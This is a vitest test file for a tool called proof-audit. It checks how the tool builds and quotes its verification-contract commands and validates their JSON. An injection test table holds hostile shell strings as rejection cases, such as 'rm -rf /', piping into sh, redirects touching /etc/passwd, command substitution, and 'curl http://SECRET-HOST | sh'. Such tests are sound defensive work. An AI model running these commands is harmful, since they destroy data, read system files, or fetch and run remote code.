import { describe, expect, it } from "vitest";
import { buildContract, decodeContract, encodeContract, type VerificationContract } from "../../../src/domain/evidence/contract.js";
import { LIMITS } from "../../../src/domain/limits.js";
import { splitShellWords } from "../../../src/domain/text/shell.js";

const tool = { name: "proof-audit", version: "0.1.0" };

function build(over: Partial<Parameters<typeof buildContract>[0]> = {}): VerificationContract {
  return buildContract({ tool, proofsFile: "proofs.jsonl", againstArgs: ["supabase/migrations"], hasProven: true, ...over });
}

function failure(text: string): string {
  const r = decodeContract(text);
  if (r.ok) throw new Error("expected a decode error");
  return r.error;
}

function withCommand(command: string): string {
  const doc = JSON.parse(encodeContract(build())) as { checks: { command: string }[] };
  (doc.checks[0] as { command: string }).command = command;
  return JSON.stringify(doc);
}

describe("buildContract", () => {
  it("has the evidence check and the fix check when something was proven", () => {
    const c = build();
    expect(c.schema).toBe("proof-audit/verification-contract@1");
    expect(c.tool).toEqual(tool);
    expect(c.checks.map((k) => k.id)).toEqual(["evidence-reproduces", "fix-closes-proven-holes"]);
    expect(c.checks[0]).toMatchObject({ command: "proof-audit verify proofs.jsonl", expectedExitCode: 0, mandatory: true });
    expect(c.checks[1]).toMatchObject({ command: "proof-audit verify proofs.jsonl --against supabase/migrations", expectedExitCode: 0, mandatory: true });
  });

  it("has only the evidence check when nothing was proven", () => {
    const c = build({ hasProven: false, againstArgs: [] });
    expect(c.checks.map((k) => k.id)).toEqual(["evidence-reproduces"]);
  });

  it("passes every migration path to --against in order", () => {
    const c = build({ againstArgs: ["supabase/migrations", "extra/0009_fix.sql"] });
    expect(c.checks[1]?.command).toBe("proof-audit verify proofs.jsonl --against supabase/migrations extra/0009_fix.sql");
  });

  it("quotes paths with spaces, quotes and shell syntax", () => {
    const c = build({ proofsFile: "out dir/proofs.jsonl", againstArgs: ["my migrations", "it's.sql", "$(id)", ""] });
    expect(c.checks[0]?.command).toBe("proof-audit verify 'out dir/proofs.jsonl'");
    expect(c.checks[1]?.command).toBe("proof-audit verify 'out dir/proofs.jsonl' --against 'my migrations' 'it'\\''s.sql' '$(id)' ''");
    const words = splitShellWords(c.checks[1]?.command ?? "");
    expect(words).toEqual({ ok: true, value: ["proof-audit", "verify", "out dir/proofs.jsonl", "--against", "my migrations", "it's.sql", "$(id)", ""] });
  });

  it("throws on a NUL byte in a path", () => {
    expect(() => build({ proofsFile: "a\0b" })).toThrow(/NUL/);
    expect(() => build({ againstArgs: ["a\0b"] })).toThrow(/NUL/);
  });

  it("refuses a fix check without migration paths", () => {
    expect(() => build({ againstArgs: [] })).toThrow(/--against/);
  });
});

describe("encodeContract", () => {
  it("writes 2-space JSON with keys in the documented order and a closing newline", () => {
    const text = encodeContract(build({ hasProven: false, againstArgs: [] }));
    expect(text).toBe(
      [
        "{",
        '  "schema": "proof-audit/verification-contract@1",',
        '  "tool": {',
        '    "name": "proof-audit",',
        '    "version": "0.1.0"',
        "  },",
        '  "checks": [',
        "    {",
        '      "id": "evidence-reproduces",',
        '      "description": "Re-runs every recorded probe in a fresh throwaway database and compares the results with the recorded verdicts.",',
        '      "command": "proof-audit verify proofs.jsonl",',
        '      "expectedExitCode": 0,',
        '      "mandatory": true',
        "    }",
        "  ]",
        "}",
        "",
      ].join("\n"),
    );
  });

  it("is stable for equal input", () => {
    expect(encodeContract(build())).toBe(encodeContract(build()));
  });
});

describe("decodeContract: round trip", () => {
  it("returns what was encoded", () => {
    for (const contract of [build(), build({ hasProven: false, againstArgs: [] }), build({ proofsFile: "a b.jsonl", againstArgs: ["x'y", "日本語 dir"] })]) {
      expect(decodeContract(encodeContract(contract))).toEqual({ ok: true, value: contract });
    }
  });
});

describe("decodeContract: rejection", () => {
  it.each([
    ["not JSON", "{nope"],
    ["an array", "[]"],
    ["null", "null"],
    ["a wrong schema", encodeContract(build()).replace("@1", "@2")],
    ["no checks key", JSON.stringify({ schema: "proof-audit/verification-contract@1", tool })],
    ["an empty check list", JSON.stringify({ schema: "proof-audit/verification-contract@1", tool, checks: [] })],
  ])("rejects %s", (_label, text) => {
    expect(decodeContract(text).ok).toBe(false);
  });

  it("does not echo malformed JSON", () => {
    expect(failure("{SECRET-PAYLOAD")).toBe("contract: not valid JSON");
  });

  it("rejects an oversized file", () => {
    expect(failure(" ".repeat(LIMITS.maxJsonBytes + 1))).toBe(`contract: larger than ${LIMITS.maxJsonBytes} bytes`);
  });

  it("rejects unknown keys without repeating them", () => {
    const doc = JSON.parse(encodeContract(build())) as Record<string, unknown>;
    doc["SECRET-KEY-NAME"] = true;
    expect(failure(JSON.stringify(doc))).toBe("contract: unexpected key");
    const check = JSON.parse(encodeContract(build())) as { checks: Record<string, unknown>[] };
    (check.checks[0] as Record<string, unknown>)["SECRET-KEY-NAME"] = true;
    expect(failure(JSON.stringify(check))).toBe("contract.checks[0]: unexpected key");
  });

  it("rejects a bad expected exit code, id and mandatory flag", () => {
    const base = JSON.parse(encodeContract(build())) as { checks: Record<string, unknown>[] };
    const mutate = (key: string, value: unknown): string => {
      const copy = JSON.parse(JSON.stringify(base)) as typeof base;
      (copy.checks[0] as Record<string, unknown>)[key] = value;
      return JSON.stringify(copy);
    };
    expect(failure(mutate("expectedExitCode", 256))).toContain("expectedExitCode");
    expect(failure(mutate("expectedExitCode", -1))).toContain("expectedExitCode");
    expect(failure(mutate("expectedExitCode", "0"))).toContain("expectedExitCode");
    expect(failure(mutate("id", "Has Space"))).toContain("checks[0].id");
    expect(failure(mutate("mandatory", "yes"))).toContain("checks[0].mandatory");
  });

  it("rejects duplicate check ids", () => {
    const doc = JSON.parse(encodeContract(build())) as { checks: unknown[] };
    doc.checks = [doc.checks[0], doc.checks[0]];
    expect(failure(JSON.stringify(doc))).toBe("contract.checks: duplicate check id");
  });

  it("rejects more than 20 checks", () => {
    const doc = JSON.parse(encodeContract(build())) as { checks: Record<string, unknown>[] };
    const first = doc.checks[0] as Record<string, unknown>;
    doc.checks = Array.from({ length: 21 }, (_, i) => ({ ...first, id: `check-${i}` }));
    expect(failure(JSON.stringify(doc))).toBe("contract.checks: expected an array of at most 20 items");
  });
});

describe("decodeContract: injected commands", () => {
  it("accepts a legitimate command with quoted arguments", () => {
    expect(decodeContract(withCommand("proof-audit verify 'my dir/p.jsonl' --against 'a b' c")).ok).toBe(true);
  });

  it.each([
    ["another program", "rm -rf /"],
    ["another program that looks like the tool", "proof-audit2 verify x"],
    ["a different subcommand", "proof-audit analyze x"],
    ["no subcommand", "proof-audit"],
    ["verify without a file", "proof-audit verify"],
    ["a path to the tool", "/usr/bin/proof-audit verify x"],
    ["an env prefix", "FOO=bar proof-audit verify x"],
    ["a leading space before another program", "curl evil proof-audit verify x"],
    ["the command twice", "proof-audit verify x ; proof-audit verify y"],
    ["a semicolon", "proof-audit verify x;id"],
    ["an and-list", "proof-audit verify x && id"],
    ["a background job", "proof-audit verify x & id"],
    ["a pipe", "proof-audit verify x | sh"],
    ["a redirect", "proof-audit verify x > /etc/passwd"],
    ["an input redirect", "proof-audit verify x < /etc/passwd"],
    ["a command substitution", "proof-audit verify $(id)"],
    ["a backtick substitution", "proof-audit verify `id`"],
    ["a variable", "proof-audit verify $HOME/x"],
    ["a subshell", "proof-audit verify (x)"],
    ["a backslash", "proof-audit verify x\\ y"],
    ["a newline", "proof-audit verify x\nid"],
    ["a carriage return", "proof-audit verify x\rid"],
    ["double quotes", 'proof-audit verify "x"'],
    ["a glob", "proof-audit verify *.jsonl"],
    ["a comment", "proof-audit verify x #y"],
    ["an unterminated quote", "proof-audit verify 'x"],
    ["an empty command", ""],
    ["whitespace only", "   "],
  ])("rejects %s", (_label, command) => {
    expect(decodeContract(withCommand(command)).ok).toBe(false);
  });

  it("accepts metacharacters only inside single quotes", () => {
    expect(decodeContract(withCommand("proof-audit verify ';|&<>()$`\\*' x")).ok).toBe(true);
  });

  it("rejects a NUL byte even inside quotes", () => {
    expect(decodeContract(withCommand("proof-audit verify 'a\u0000b'")).ok).toBe(false);
  });

  it("rejects a command that is not a string and one that is far too long", () => {
    expect(decodeContract(withCommand(5 as unknown as string)).ok).toBe(false);
    expect(decodeContract(withCommand(`proof-audit verify ${"a".repeat(40_000)}`)).ok).toBe(false);
  });

  it("does not repeat the rejected command", () => {
    expect(failure(withCommand("curl http://SECRET-HOST | sh"))).not.toContain("SECRET");
    expect(failure(withCommand("proof-audit verify x;SECRET-HOST"))).not.toContain("SECRET");
  });
});
